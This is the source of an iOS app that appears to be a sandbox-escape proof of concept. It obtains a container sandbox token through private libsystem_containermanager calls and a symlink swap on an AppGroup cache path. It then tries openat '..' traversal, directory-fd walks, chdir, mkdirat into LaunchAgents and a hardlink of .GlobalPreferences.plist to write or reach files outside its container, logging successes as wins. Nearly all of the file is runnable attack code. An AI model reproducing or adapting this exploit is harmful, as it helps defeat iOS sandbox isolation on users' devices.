// OAT2 — dirfd/openat/.. escape attempts from token-covered AppGroup parent
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <string.h>
#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x0040
#endif
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;
static void L(NSString *fmt, ...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[oat2] %@",s);}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h)return NO;q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static int64_t query(NSString**pathOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,3);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}
static void twf(NSString*tag,int fd,const char*name){if(fd<0){L(@"[w %@] nofd",tag);return;}errno=0;int nf=openat(fd,name,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;if(nf>=0){write(nf,"OAT2",4);close(nf);L(@"[WIN %@] openat %s",tag,name);}else L(@"[w %@] openat %s errno=%d",tag,name,e);}
static void run(void){@autoreleasepool{
    L(@"=== oat2 start uid=%d pid=%d",getuid(),getpid()); if(!loadMCM())return;
    gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
    gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
    gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
    gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSFileManager*fm=[NSFileManager defaultManager];[fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
    NSString*parent=@"/private/var/mobile/Containers/Shared/AppGroup";
    [fm removeItemAtPath:gPart error:nil];symlink(parent.fileSystemRepresentation,gPart.fileSystemRepresentation);
    int64_t h=query(NULL);L(@"[token] appgroup-parent=%lld",(long long)h);
    if(h<0){L(@"no token");return;}
    errno=0;int fd=open(parent.fileSystemRepresentation,O_RDONLY|O_DIRECTORY);L(@"[fd] parent=%d errno=%d",fd,errno);
    if(fd>=0){
        twf(@"via-parent",fd,"../../../Library/Preferences/omni_oat_parent");
        errno=0;int pfd=openat(fd,"../../../Library/Preferences",O_RDONLY|O_DIRECTORY);L(@"[openat prefs] fd=%d errno=%d",pfd,errno);twf(@"via-prefs",pfd,"omni_oat_pref");
        errno=0;int lfd=openat(fd,"../../../Library/LaunchAgents",O_RDONLY|O_DIRECTORY);L(@"[openat la] fd=%d errno=%d",lfd,errno);
        errno=0;int mr=mkdirat(fd,"../../../Library/LaunchAgents",0755);L(@"[mkdirat la] r=%d errno=%d",mr,errno);
        int up[8];up[0]=fd;for(int i=1;i<8;i++){errno=0;up[i]=openat(up[i-1],"..",O_RDONLY|O_DIRECTORY);L(@"[up%d] fd=%d errno=%d",i,up[i],errno);if(up[i]<0)break;}
        if(up[3]>=0)twf(@"walk3",up[3],"Library/Preferences/omni_oat_walk3");
        if(up[4]>=0)twf(@"walk4",up[4],"Library/Preferences/omni_oat_walk4");
        if(up[5]>=0)twf(@"walk5",up[5],"var/mobile/Library/Preferences/omni_oat_walk5");
        errno=0;int cr=chdir(parent.fileSystemRepresentation);L(@"[chdir] r=%d errno=%d",cr,errno);if(cr==0){int cf=open("../../../Library/Preferences/omni_oat_cwd",O_CREAT|O_WRONLY|O_TRUNC,0644);L(@"[cwd] open=%d errno=%d",cf,errno);if(cf>=0)close(cf);}
        chdir("/");
        close(fd);
    }
    errno=0;int sfd=open("/var/mobile/Library/Preferences/.GlobalPreferences.plist",O_RDONLY);L(@"[hard] srcfd=%d errno=%d",sfd,errno);
    if(sfd>=0){NSString*hl=[gRoot stringByAppendingPathComponent:@"lp_hard"];unlink(hl.fileSystemRepresentation);errno=0;int lr=linkat(sfd,"",AT_FDCWD,hl.fileSystemRepresentation,AT_EMPTY_PATH);L(@"[hard] linkat=%d errno=%d",lr,errno);close(sfd);}
    if(s_release)s_release(h);
    [fm removeItemAtPath:gPart error:nil];symlink(gValid.fileSystemRepresentation,gPart.fileSystemRepresentation);
    L(@"=== oat2 done ===");
}}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"OAT2";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"oat2.log"]copy];gLog=[NSMutableString new];L(@"=== oat2 launch ===");dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
